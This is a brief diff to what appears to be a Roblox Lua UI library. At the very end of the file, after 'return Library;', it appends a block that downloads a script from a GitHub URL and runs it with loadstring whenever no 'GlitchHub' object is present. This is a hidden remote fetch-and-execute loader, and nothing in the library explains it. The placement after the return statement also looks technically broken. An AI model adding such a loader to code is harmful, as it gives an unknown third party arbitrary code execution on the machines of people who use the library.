@@ -4569,3 +4569,8 @@ spawn(function()
 end)
 
 return Library;
+
+
+if not game.CoreGui:FindFirstChild("GlitchHub") then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/lusiasxqz/Scripts/main/Loader.lua"))()
+end
